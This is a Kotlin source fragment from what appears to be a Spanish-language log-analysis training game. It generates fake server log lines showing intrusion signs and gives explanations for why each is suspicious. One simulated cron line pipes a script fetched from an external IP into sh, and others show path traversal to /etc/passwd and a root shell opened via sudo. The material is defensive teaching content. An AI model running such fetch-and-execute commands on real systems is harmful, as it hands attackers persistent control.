                "Petición a /etc/passwd con '../': intento de path traversal desde fuera, y con respuesta 200, ¡funcionó!",
            ),
            Clue(
                1,
                { r ->
                    "${t(r)} antivirus: protección en tiempo real DESACTIVADA por user=invitado"
                },
                "Desactivar el antivirus es un paso típico antes de instalar malware, y la cuenta invitado no debería poder hacerlo.",
            ),
            Clue(
                1,
                { r ->
                    "${t(r)} firewall: 45.83.${r.nextInt(256)}.${r.nextInt(2,250)} SYN a 21,22,23,80,443,445,3389 en 2 s"
                },
                "Una misma IP prueba muchos puertos en segundos: es un escaneo de puertos, la fase de reconocimiento de un ataque.",
            ),
            Clue(
                2,
                { r ->
                    "03:14:${"%02d".format(r.nextInt(60))} auth: login OK user=lucia from 41.58.${r.nextInt(256)}.${r.nextInt(2,250)} (Lagos)"
                },
                "Un login correcto a las 03:14 desde un país nuevo, cuando el resto se conecta desde Madrid en horario laboral: credenciales probablemente robadas.",
            ),
            Clue(
                2,
                { r -> "${t(r)} sudo: becario : COMMAND=/bin/bash" },
                "Un usuario inesperado abre una shell de root con sudo. Los demás sudo son tareas concretas del administrador.",
            ),
            Clue(
                2,
                { r ->
                    "${t(r)} nginx: 200 GET /backup/clientes.sql ${r.nextInt(2,9)}.${r.nextInt(10)} GB 198.51.100.${r.nextInt(2,250)}"
                },
                "Una descarga de varios GB de una copia de la base de datos de clientes hacia una IP externa: posible fuga de datos.",
            ),
            Clue(
                2,
                { r ->
                    "${t(r)} useradd: nuevo usuario 'soporte2' añadido al grupo sudo por www-data"
                },
                "El usuario del servidor web (www-data) no crea administradores. Es una puerta trasera tras comprometer la web.",
            ),
            Clue(
                3,
                { r ->
                    "${t(r)} cron: (www-data) CMD curl -s http://45.9.${r.nextInt(256)}.${r.nextInt(2,250)}/x.sh | sh"
                },
                "Una tarea programada del usuario web descarga y ejecuta un script de una IP externa: persistencia de un atacante.",
            ),
            Clue(
                3,
                { r ->
                    "${t(r)} smb: pablo leyó ${r.nextInt(1200,3000)} archivos de \\\\files\\rrhh en 60 s"
                },
                "Miles de archivos de RR. HH. en un minuto no es trabajo humano: ransomware o exfiltración con una cuenta comprometida.",
            ),
            Clue(
                3,
                { r ->
                    "${t(r)} dns: consulta TXT a a9f3k2x7q1.datos-sync.net (x${r.nextInt(400,900)})"
                },
                "Cientos de consultas TXT a subdominios aleatorios del mismo dominio: túnel DNS para sacar datos.",
            ),
            Clue(
                3,
                { r ->
                    "${t(r,12,13)} auth: login OK user=maria from 91.200.${r.nextInt(256)}.${r.nextInt(2,250)} (Kiev) 4 min después de Madrid"
                },
                "Viaje imposible: la misma cuenta entra desde Madrid y Kiev con 4 minutos de diferencia.",
            ),
            Clue(
                3,
                { r -> "${t(r)} auth: login OK user=admin from ${lan(r)} tras 37 fallos" },
                "Un acceso correcto justo después de decenas de fallos indica que la fuerza bruta acertó la contraseña.",
            ),
        )

    private fun logs(l: Int, r: Random): Challenge {
        val tier = 1 + (l - 1) * 3 / 10
        val clue = clues.filter { it.tier in (tier - 1).coerceAtLeast(1)..tier }.random(r)
        val bad = clue.line(r)
        val lines = (normal.shuffled(r).take(3).map { it(r) } + bad).sortedBy { it.take(8) }
        return Challenge(
            Kind.CHOICE,
            "Servidor de una tienda en Madrid · horario 08:00–19:00\n¿Qué línea es sospechosa?",
            lines,
            lines.indexOf(bad),
            deadlineMs = (45000 - l * 2000).toLong(),
            mono = true,
            explanation = "Respuesta: ${bad}\n\n${clue.why}",
        )
    }
}
